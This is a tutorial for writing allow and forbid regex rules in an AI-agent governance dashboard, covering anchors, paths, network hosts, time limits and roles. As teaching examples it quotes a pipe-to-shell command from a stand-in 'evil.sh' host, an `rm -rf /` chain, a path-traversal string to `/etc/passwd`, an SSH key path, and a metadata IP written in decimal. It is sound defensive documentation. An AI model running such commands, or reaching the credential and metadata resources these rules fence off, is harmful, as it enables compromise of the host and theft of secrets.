# Writing permissions: a guide

This teaches you to write permissions for the governance layer. It assumes no
prior knowledge of regular expressions.

Read sections 1–4 before writing your first rule. Sections 5–9 are reference
you can come back to.

> **Keep this current.** If the rule language gains a field or a resource kind,
> or the dashboard's rule forms change, update this guide in the same change. A
> guide people learn from is worse than useless once it has drifted.

---

> For a precise technical reference, grammar, evaluation order, limits, wire
> format, see `docs-notes/PERMISSION-SPEC.md`. This document teaches; that one
> specifies. The shipped rules and the reason for each are in
> `docs-notes/BASELINE-RULES.md`.

Everything below is done on the governance page of the Control UI, under
**Settings → Governance** (on a local install,
`http://127.0.0.1:18789/settings/governance`). There is no terminal command for
this any more: since 2026-09-07 the dashboard is the only way to write a rule.

## 1. The mental model

The system is **default-deny**. When your agent tries to do something, it is
refused unless a permission says otherwise. Permissions are the _only_ way
anything is allowed.

"Refused" has one refinement. Under the shipped setting **Ask a human on a
miss**, an action no rule covers is first put to a person who manages that agent:
on the governance page under _Waiting for your answer_ when the run was started
from there, or in the chat when it was started from a chat. If nobody answers in
time, five minutes by default, it is refused. With that setting off, it is
refused at once. Either way, nothing happens without either a rule or a person
saying yes.

Every permission answers these questions:

| Question                 | Field     | Example                                   |
| ------------------------ | --------- | ----------------------------------------- |
| What **kind** of thing?  | `kind`    | a command, a file path, a network host    |
| Which **specific** ones? | `pattern` | commands that are exactly `ls`            |
| **Allow** or **forbid**? | `effect`  | allow (the default), or forbid. See §4b   |
| For **how long**?        | lifetime  | 30 minutes, or blank for "never expires"  |
| For **which agent**?     | agent     | one agent, or every agent (Administrator) |

For path rules there is one more: **which direction**, read, write, or both
(§4c).

The add-rule form has no description field. Rules written for you carry one:
a folder grant describes itself ("Grant on src, except src/secrets"), and a rule
created by approving a request says who asked and why. Everything else is shown
by its pattern.

> **Agent names are not case-sensitive.** They are folded to lower case before
> they are stored or compared, so `Scout`, `scout` and `SCOUT` are the same agent
> in a rule's scope, in an assignment and at the emergency stop. Older notes that
> tell you to match the spelling exactly describe a version before 2026-09-02.

### One rule that will save you confusion

**Adding an allow rule can never take access away.**

Denial is the default, so most of the time you are writing permissions, not
restrictions. The consequence worth internalising early: **you cannot narrow an
existing permission by adding another one.** If `ls` is already allowed forever,
adding "allow `ls` for 10 minutes" changes nothing. It is still allowed
forever. To reduce access you must _remove_ the broader rule.

The reverse does happen, and it is just as easy to miss: if `ls` is allowed for
10 minutes and you add "allow `ls`" with no time limit, the temporary grant has
become a permanent one. The system tells you about both (§7), but understanding
_why_ saves you a confusing afternoon.

**The exception, and it is an important one:** a **forbid** rule does take
access away, and no allow rule can override it. That is what it is for. See §4b,
but read the rest of this section first, because forbidding is the tool you
reach for second, not first.

---

## 2. The three kinds

| Kind      | Covers                                                                  | What your pattern is compared against                 |
| --------- | ----------------------------------------------------------------------- | ----------------------------------------------------- |
| `command` | shell commands, terminal input, and the other ways an agent acts (§2.2) | the full command line, e.g. `ls -la /tmp`             |
| `path`    | files the agent reads, searches, lists, writes, or patches              | each file path, e.g. `config/settings.json`. See §2.1 |
| `network` | web addresses the agent fetches                                         | the hostname only, e.g. `api.example.com`             |

Three things people get wrong here:

- **`network` matches the hostname, not the whole URL.** For
  `https://api.example.com/v1/weather?key=abc`, your pattern is compared
  against `api.example.com` alone. Do not put `https://` or a path in it.
- **A rule for one kind never authorises another.** Allowing every `command`
  does not allow any `path`. Each kind is a separate world.
- **`path` covers searching and listing too, not just opening a file.**
  Searching a file returns its contents, and listing a directory reveals what is
  in it, so `grep`, `find` and `ls` are checked against your `path` rules exactly
  as `read` is. A rule that keeps an agent out of a folder also keeps it from
  searching there, and a folder you meant it to search needs a `path` rule, not a
  `command` rule.

A search is judged on the folder it **starts from**, then reads everything below
it. So a search started above a forbidden folder reaches into it. On the
built-in runtime the forbidden results are removed before the agent sees them,
and the agent is told how many were withheld. On the Codex backend they cannot
be removed, so the reach is written to the audit ledger rather than prevented.
An agent is only on that backend if an Administrator has permitted it.

An address can be written more than one way, and the system settles that for
you before your pattern is checked: a trailing dot is removed, capitals are
folded, and an IP address written as a single number or in hex is turned back
into the ordinary dotted form. So `^api[.]example[.]com$` matches a URL written
`https://API.example.com./v1`, and a rule naming `169.254.169.254` cannot be
walked around by writing `2852039166` instead.

Paths use forward slashes (`/`) even on Windows, so one rule works everywhere.

### 2.1 What a file path looks like when your rule is checked

This matters, because your pattern is compared against the **cleaned-up** path,
not the text the agent typed. Before any rule is applied, the system works out
which file is actually being touched:

1. `~` is expanded, and the path is made absolute.
2. `..` steps are collapsed, so `a/../b` becomes `b`.
3. Shortcuts (symbolic links) are followed to the real file.
4. The result is written **one of two ways**:
   - **inside your project folder** → the short form, `config/settings.json`
   - **anywhere else** → the full path, `/etc/passwd` or
     `C:/Users/kinan/.ssh/id_rsa`

So every example in this guide, `^src/.*$`, `^workspace/.*$`, describes files
**inside the project**. That is the common case and needs nothing special.

A file inside the project also has a full path, and your rule is tested against
**both** spellings, so a rule written either way matches it. Prefer the short
form anyway: a full path is specific to one machine, and a rule written that way
on a Windows laptop will not match on a Linux server.

**Why this is the useful part.** You do not have to defend against tricks. A
rule of `^src/.*$` cannot be fooled by `src/../../etc/passwd`, because by the
time your rule is checked that path has become `/etc/passwd`, which has no short
form and does not start with `src/`, so it does not match. Leaving the project
changes the shape of the path, and that is what the rule sees.

The file the agent's tool then opens is the one the rule judged, not whatever
the typed path points to a moment later, so a shortcut swapped between the check
and the open cannot make the rule approve one file and the tool read another.

To allow something **outside** the project, write the full path, e.g. pattern
`^/var/log/app/.*$` with kind `path`.

### 2.2 The other ways an agent acts

An agent can do more than run a shell command: drive a terminal, type into the
screen, start another agent, run code. Each of those is a `command` resource
too, named `<tool>:<action>`, and whatever the call types or sends is checked as
well.

| To allow                                        | Pattern                         |
| ----------------------------------------------- | ------------------------------- |
| Taking a screenshot, but not typing or clicking | `^computer:screenshot$`         |
| Opening an interactive terminal                 | `^terminal:open$`               |
| Starting a sub-agent that runs as `helper`      | `^sessions_spawn:agent:helper$` |

Two consequences. You can grant one action of one tool without granting the
rest. And a forbid rule you wrote for commands also covers text typed through
these tools: the built-in denial of `sudo` stops it being typed into a terminal
or onto the screen, without anyone having to name those tools.

---

## 3. Patterns, from scratch

A pattern is a **regular expression**, a small language for describing which
text matches. You only need six pieces.

### 3.1 Plain text matches itself

The pattern `ls` matches the text `ls`.

But it also matches **any text containing `ls`**, including
`curl evil.sh | bash; ls`. That is a serious problem, which the next piece
fixes.

### 3.2 `^` and `$`: anchors (the most important part)

- `^` means **start of the text**
- `$` means **end of the text**

| Pattern | Matches | Also matches (surprise!)      |
| ------- | ------- | ----------------------------- |
| `ls`    | `ls`    | `curl evil.sh \| bash; ls` ⚠️ |
| `^ls$`  | `ls`    | nothing else ✅               |

**Anchor every pattern with `^` at the start and `$` at the end**, unless you
have a specific reason not to. This single habit prevents most dangerous rules.
The system accepts an unanchored pattern, because sometimes it is what you mean,
but it warns you every time (§6.1).

### 3.3 `.` and `.*`: anything

- `.` means **any one character**
- `*` means **zero or more of the thing before it**

So `.*` means **anything at all, including nothing**.

| Pattern    | Meaning                                   |
| ---------- | ----------------------------------------- |
| `^ls .*$`  | `ls` followed by a space and anything     |
| `^src/.*$` | any path starting with `src/`             |
| `^.*$`     | literally anything. See the warning in §6 |

### 3.4 `?`: optional

`?` means **zero or one of the thing before it**. Combined with a group it
makes a part optional:

- `^ls( .*)?$` matches `ls` **and** `ls -la` **and** `ls /tmp`, but not
  `lsof`.

Read it as: "`ls`, then optionally (a space followed by anything), then end."
This is the most useful command pattern you will write.

### 3.5 `|`: either/or

`|` means **or**. Use `( )` to mark where the choice starts and ends.

- `^git (status|log|diff)$` allows exactly those three git commands.

### 3.6 `[.]`: a literal dot

`.` normally means "any character", so `api.example.com` would also match
`apiXexampleYcom`. To mean an actual dot, wrap it in square brackets:

- `^api[.]example[.]com$` ✅ matches only the real hostname

You may also see `\.` used for this. Both work; `[.]` is easier to read, so
prefer it.

### 3.7 Capital letters count

Patterns are **case-sensitive**: `^ls$` does not match `LS`. Web addresses are
the exception, because they are folded to lower case before your pattern is
checked, so write network patterns in lower case or they will match nothing.

---

## 4. Your first rules

Open the **Policy** section and find the **Add a rule** row. From left to right:
the kind, **allow** or **forbid**, (for a path) **read + write**, **read only**
or **write only**, the pattern, the agent, and the lifetime in minutes. Three to
start with:

| Kind      | Pattern                 | What it lets the agent do |
| --------- | ----------------------- | ------------------------- |
| `command` | `^ls( .*)?$`            | List directories          |
| `path`    | `^workspace/.*$`        | Work inside one folder    |
| `network` | `^api[.]example[.]com$` | Reach one API             |

Leave the lifetime blank and the rule never expires; the list says "never
expires" beside it so you can tell permanent grants from temporary ones.

**The agent field.** An Administrator may leave it blank, which makes the rule
**global**: it binds every agent, including ones not created yet. A User must
name one of their own agents; the field suggests them.

When you press **Add rule**, the rule is saved and anything worth knowing about
it appears straight away: a warning if the pattern is broader than it looks
(§6.1), and a notice if it clashes with a rule that already exists (§7). Read
them. They are the only moment the system can tell you that a rule does not do
what you think.

**Test before you trust.** An Administrator can set the posture to `monitor`
first: decisions are recorded but nothing is blocked, so you can see exactly
what _would_ have happened. Set it on the **Policy** section, let the agent work,
then read the **Audit ledger** section. To try it on one agent only, use
**Observe one agent**, which puts just that agent in `monitor`. Built-in
restrictions and the emergency stop still apply in `monitor`. When the ledger
shows what you expect, switch back to `enforce`.

Monitor stops rules being acted on at all, so it is an Administrator's setting.
A User who wants it for their agent asks an Administrator.

---

## 4b. Allowing and forbidding

Every rule you write does one of two things. The default is **allow**, and most
of the time that is what you want: the system refuses everything it was not told
to permit, so the job is usually to permit the right things.

The other option is **forbid**. It is worth understanding when to reach for it,
because at first glance it looks unnecessary: if nothing is allowed by default,
why say "never"?

### Why "forbid" is not the same as "don't allow"

Suppose you want an agent kept out of the billing folder. You could simply not
write a rule for it, and today the agent cannot get in. But tomorrow somebody
grants that agent broad access to the project, a reasonable thing to do, and
billing is inside the project. The restriction you were relying on was never
written down anywhere, so nothing stopped the new rule from undoing it.

A **forbid** rule is different. It is checked _before_ every allow rule, and no
allow rule can override it. Write one and it keeps holding no matter what
anybody permits later. That is the difference between "not currently allowed"
and "must never happen", and only the second one survives other people.

The order rules appear in the list decides nothing. Forbid beats allow, always,
whichever was written first and whoever wrote it.

This is exactly how the built-in protections work. Credential files, `sudo`,
the governance folder itself are all forbid rules. You are writing the same kind
of thing.

**On the form:** choose **forbid** in the second dropdown. For example: kind
`path`, **forbid**, pattern `^billing/.*$`. A forbid rule shows a **DENY** badge
in the list.

### Allowing a folder except part of it

The commonest reason to write a forbid rule is to carve something out of a
grant, and there is a form that does both at once: **Allow a folder, except…**,
higher up in the **Policy** section. Give it the folder, and, one per line, the
paths inside it that stay forbidden.

It writes ordinary rules for you, and lists them back: one forbid rule for each
exception, then one allow rule for the folder. Each can be removed on its own
later. A few details are worth knowing:

- The folder pattern it writes is `^src(/|$)`, not `^src`, so granting `src`
  does not also grant a sibling called `src-old`.
- The exceptions are written **first**. If something stops the write half-way,
  the agent is left with less access than you intended, never more.
- An exception that is not inside the folder is refused, naming both paths,
  rather than quietly writing a denial somewhere you were not looking.
- At most 50 exceptions per grant.

### One thing that surprises people

A forbid rule that matches everything will stop the agent doing _anything_ of
that kind, including things an existing allow rule permits, because forbidding
wins. If you write `.*` as a forbid rule you have switched that whole category
off. The system warns you when you do this; the warning is worth reading rather
than clicking past.

## 4c. Reading versus writing

For **path** rules only, you can say which direction a rule covers:

| Setting      | Meaning                                            |
| ------------ | -------------------------------------------------- |
| read + write | Both. This is the default                          |
| read only    | The agent may look at these files, not change them |
| write only   | Rarely useful on its own; mostly for forbidding    |

This is the difference between "the agent can see my project" and "the agent can
edit my project", and they are very different levels of trust. The starting
policy your installation shipped with uses it: the agent gets **read-only**
access to your workspace, and changing files is something you grant on purpose.

**On the form:** the third dropdown, which appears only when the kind is `path`.
For example: kind `path`, **allow**, **read only**, pattern `^src/.*$`. The list
marks a narrowed rule `(read)` or `(write)`.

Commands and network addresses have no direction. A command is not a read or a
write, it is whatever it does, so the option is not offered for them, and the
server refuses it if it is sent anyway rather than quietly ignoring it.

Which direction an action is comes from the tool, not from you: reading,
searching and listing are reads; writing, editing and patching are writes.

### The combination to be careful with

**A forbid rule narrowed to one direction only forbids that direction.** If you
write "forbid _reading_ the billing folder", writing to it is still allowed by
that rule. That is deliberate, narrowing a rule must never accidentally
strengthen it in the other direction, but it is almost never what someone
means.

If you want a folder completely off limits, leave the direction as **read +
write**. The system warns you specifically about this one, because it is the
single most counter-intuitive thing the rule language can express. The folder
form never narrows its exceptions for the same reason: an exception is an
exception to the whole folder.

## 4d. Who can write rules, and asking for one

| You are       | You can                                                                                     |
| ------------- | ------------------------------------------------------------------------------------------- |
| Viewer        | Read the rules, the ledger and the requests. Not write anything                             |
| User          | Write and remove rules **for the agents assigned to you**, unless Root has withheld that    |
| Administrator | Write and remove rules for any agent in the organisation, and global rules; decide requests |
| Root          | Everything an Administrator can, plus switching some built-in rules off (§7)                |

If you cannot write the rule you need, because it is global or for an agent that
is not yours, or because Root has withheld your authoring, **ask for it**. In the
**Rule requests** section, **Request a rule** takes a kind, a pattern, a reason
(up to 500 characters) and an agent (blank asks for a rule binding every agent).
For a `path`, a **Read or write** dropdown appears, as on the Add a rule form
(§4c): leave it at **read + write** to ask for both directions, or narrow the
request to one. A request always asks for an **allow** rule. You can have up to 20
waiting at once.

An Administrator sees the request with **Approve** and **Reject**, and a path
request's row says which direction it asks for, `path (read)` or `path (write)`. While it is
waiting, the row shows **If this is approved**, followed by the same warnings and
clash notices the rule would get if they wrote it themselves (§6.1, §7),
worked out against the rules as they stand. So the person deciding sees that
`ls` is unanchored, or that it would make somebody's temporary rule permanent,
before the rule exists rather than after. Approving creates exactly what was
requested, from the stored request, and the new rule's description says who
asked and why.

If the agent a request names has been **deleted** since the request was made, the row
says so and only **Reject** is offered. Deleting an agent clears everything its name
carried, and approving would hand the rule to whichever agent is registered under that
name next.

Requests also come from escalations. When somebody answers an agent's question
with **Always allow**, or answers a question that already timed out with
**Would allow**, no rule is created there and then. A request is filed for that
agent and that exact resource, escaped and anchored, in the direction the agent
used, and an Administrator approves it like any other.

### Asking for a change to one agent's posture or escalation

Two settings belong to one agent rather than to a rule: its **posture** (enforce or
monitor) and what happens when it tries something no rule covers (**ask a human** or
**deny**). Only an Administrator sets them. A User sees them in the **Policy**
section with no control to change them and a note pointing here.

To ask, use **Request a change for one agent**, also under **Rule requests**: pick
one of your agents, the setting, the value, and a reason. It joins the same queue,
an Administrator decides it the same way, and approving it applies the setting. An
Administrator can use the same form to record a request instead of making the change.

**A posture cannot be switched off for one agent**, so the form does not offer it and
the server refuses it. Switching governance off is an installation-wide act, on the
Policy section's **Posture** control, and it asks you to confirm first.

---

## 5. Time limits

Every permission is either **temporary** or **indefinite**.

- Enter a lifetime in minutes → the rule stops applying when it lapses.
- Leave it blank → the rule **never expires**.

For example, two-hour access to one API: kind `network`, pattern
`^api[.]example[.]com$`, lifetime `120`. The list shows how long it has left.

Things worth knowing:

- A rule that lapsed is kept visible for a week, marked **expired**, then
  removed. This is deliberate: when something is suddenly denied, the rule that
  just expired is the explanation, and deleting it instantly would erase the
  answer.
- If a rule's expiry date is somehow corrupted, it is treated as **expired**,
  not as indefinite. The system fails towards less access, never more.
- The longest lifetime accepted is about ten years. Anything longer is capped,
  rather than overflowing into "never expires".
- Adding an identical rule that lasts longer does not shorten anything, it
  **extends** the earlier one, and you are told so (§7).

---

## 6. Mistakes, and how they fail

| Mistake                          | What you wrote                                      | What it actually allows                                                                     |
| -------------------------------- | --------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| **Forgetting anchors**           | `ls`                                                | any command containing "ls", including `rm -rf /; ls`                                       |
| **Unescaped dots**               | `^api.example.com$`                                 | `apiXexampleYcom` as well as the real host                                                  |
| **A catch-all**                  | `^.*$`                                              | _everything_ of that kind. This disables governance for that kind. The system will warn you |
| **Whole URL in a network rule**  | `^https://api[.]example[.]com/v1$`                  | nothing, ever. Only the hostname is compared                                                |
| **Capitals in a network rule**   | `^API[.]example[.]com$`                             | nothing, ever. Hostnames are folded to lower case first                                     |
| **Expecting a rule to restrict** | adding a 10-minute rule when a permanent one exists | nothing changes; remove the broader rule instead                                            |
| **Forbidding one direction**     | forbid, read only, `^billing/.*$`                   | writing to billing is still not forbidden by this rule                                      |

### 6.1 The warnings you will see

A rule that is valid but likely to do far more than it appears to is **saved,
with a warning** under the heading _This rule is broader than it looks_. They are
warnings rather than refusals because each of these can be exactly what you
mean. The wording depends on whether the rule allows or forbids, because a broad
allow removes a protection and a broad forbid removes a capability.

| The warning is about                    | When                                                                                                                    |
| --------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| Matching everything                     | An allow rule whose pattern matches every resource of its kind (`.*`, `.+`, `^`, an empty pattern, and their spellings) |
| Forbidding everything                   | The same, on a forbid rule                                                                                              |
| Not being anchored                      | The pattern does not start with `^` and end with `$`                                                                    |
| Being anchored but matching everything  | `^.*$`, `^.+$` and the like: anchors around nothing but wildcards                                                       |
| A forbid rule narrowed to one direction | §4c                                                                                                                     |

A path pattern that ends at a folder boundary, `^workspace(/|$)`, counts as
anchored: it is the shape the folder form writes, and it means "this folder and
everything below it", nothing more. In a command, a slash is not a boundary, so
`^ls(/|$)` is still warned.

The same warnings appear on a rule request before anyone approves it (§4d).

### 6.2 Patterns the system will refuse

A few patterns are refused outright, with the reason:

- one that is not a valid regular expression;
- one longer than 512 characters;
- **a repeat inside a repeat**, `^(a+)+$`, and the same shape spelled other
  ways: `^(a*)*$`, `^(.*a){20}$`, `^(a?){26}$`;
- **a repeated choice between alternatives that can match the same text**,
  `^(a|a)+$`.

The last two take effectively forever to evaluate on certain inputs, and a rule
is checked on every action the agent takes, on the server's only thread. One
such rule would freeze the whole installation, not just the agent. If you see
this refusal, rewrite without the nested repetition; `^a+$` is fine.

`?` on its own is still perfectly fine and very common (`^ls( .*)?$` and
`^https?://…$` are both accepted). What is refused is a `?` inside a group that
is then repeated, which is the same trap in different punctuation: `^(a?){26}$`
took **44 seconds** on one non-matching input before it was refused (finding
207, 2026-09-02).

---

## 7. When the system tells you about a clash

If you add a rule that relates to one already in force, a notice appears naming
the specific existing rule. The new rule is always saved; the notice tells you
what it actually changed. The **earlier rule wins**: nothing you add afterwards
can make an earlier grant smaller.

### "Rule added, but an earlier rule already covers it"

Your rule **adds nothing**. You will see this when:

- an identical rule already exists **with no time limit**, so your time limit
  has no effect
- an identical rule already covers a **longer** period than yours
- a **catch-all** already allows everything of that kind
- you scoped a rule to one agent, but an identical **global** rule already
  applies to all of them

**The restriction you thought you were applying is not in force.** Usually the
fix is to remove the older, broader rule.

### "Rule added. It extends an earlier temporary rule"

Your rule **does** change something, and this notice exists so that the change
is not a surprise. An identical rule was temporary; yours has no time limit, so
the grant is now permanent, or yours lasts longer, so the grant now continues
past the time it was meant to end. The same applies to forbid rules: a temporary
restriction becomes a lasting one.

That can be exactly right. But the person who made the first rule temporary made
it temporary on purpose, and you may not have known it existed. If the earlier
end was intended, remove your new rule. The audit ledger records the extension
too, naming the temporary rule, so whoever reviews the trail later sees it even
if they never saw this notice.

### "Rule added, but a deny rule overrides it. It will never take effect"

This one means something worse: your rule **does nothing at all**.

A forbid rule already refuses what your allow rule would permit, and forbidding
always wins. The rule is stored, appears in your rule list, looks correct, and
the agent keeps being refused. That is otherwise almost impossible to work out,
which is why the notice exists.

If you see it, do not add more permissions. Look at the forbid rule it names:

- **Written by an operator?** Somebody forbade this on purpose. Talk to them, or
  an Administrator can remove that rule.
- **Built in?** Eight restrictions ship with the product: credential files such
  as `.env` and private keys, credential folders such as `.ssh`, privilege
  commands such as `sudo`, host-destroying commands such as `shutdown`, the cloud
  metadata address, and three that protect the governance layer itself. **Root**
  can switch off the first five in the **Policy** section, after a confirmation;
  the rule stays visible, comes back when switched on, is recorded in the ledger,
  and the deployment report fails for as long as it is off. The three that
  protect the governance folder and its controls cannot be switched off by
  anyone, because an agent that could reach them could grant itself anything and
  erase the record. `docs-notes/BASELINE-RULES.md` gives the reason for each.

Most of the time the honest answer is that the agent does not need that access.

### 7b. Why is my agent still refused?

Work through these in order:

1. **Agent permissions.** Pick the agent and press **Show permissions**. This is
   every rule in force for it, global and its own, exactly as the gate reads
   them, with a count of allows and forbids. A rule you wrote for a different
   agent, or one that expired, is not there.
2. **Audit ledger.** Every decision is recorded with the resource it was about
   and the rule that decided it. Compare the resource with your pattern: a path
   in its cleaned-up form (§2.1), a hostname rather than a URL, a command with
   exactly the spacing the agent used.
3. **A forbid rule.** If the ledger names a deny rule, see the section above.
4. **The emergency stop.** A locked agent is refused everything, whatever the
   rules say, and so is anything it started.

---

## 8. Cookbook

Copy, adapt, and always keep the anchors.

**Commands**

| Goal                              | Pattern                     |
| --------------------------------- | --------------------------- |
| Exactly one command               | `^whoami$`                  |
| A command with any arguments      | `^ls( .*)?$`                |
| A few specific subcommands        | `^git (status\|log\|diff)$` |
| A command with a numeric argument | `^sleep [0-9]+$`            |
| One action of one tool            | `^computer:screenshot$`     |

**Paths**

| Goal                                       | Pattern                    |
| ------------------------------------------ | -------------------------- |
| One exact file                             | `^config/settings[.]json$` |
| Everything in a folder                     | `^workspace/.*$`           |
| A folder, not a sibling like it            | `^workspace(/\|$)`         |
| TypeScript files, in or out of the project | `^.*[.]ts$`                |
| One folder, one level deep only            | `^workspace/[^/]+$`        |

For "everything in a folder except…", use the folder form (§4b) rather than
writing the pair by hand.

**Network**

| Goal                      | Pattern                            |
| ------------------------- | ---------------------------------- |
| One host                  | `^api[.]example[.]com$`            |
| A host and its subdomains | `^([a-z0-9.-]+[.])?example[.]com$` |
| Two specific hosts        | `^(api\|cdn)[.]example[.]com$`     |

---

## 9. Checklist before saving a rule

1. Does it start with `^` and end with `$`?
2. Are literal dots written `[.]`?
3. For `network`, is it _only_ the hostname, in lower case?
4. Is it the narrowest pattern that does the job?
5. For a path, does it need write access, or is **read only** enough?
6. For a forbid rule, did you leave the direction as **read + write**?
7. Should it expire? If not, are you sure it should be permanent?
8. Did a warning or a notice appear? If so, read it. Your rule may not do what
   you think, and an extension notice means somebody else's time limit just
   changed.
9. Approving a request? Read **If this is approved** first.
10. Try it in `monitor` before enforcing, if you are an Administrator; otherwise
    check the **Audit ledger** after the agent's first attempts.
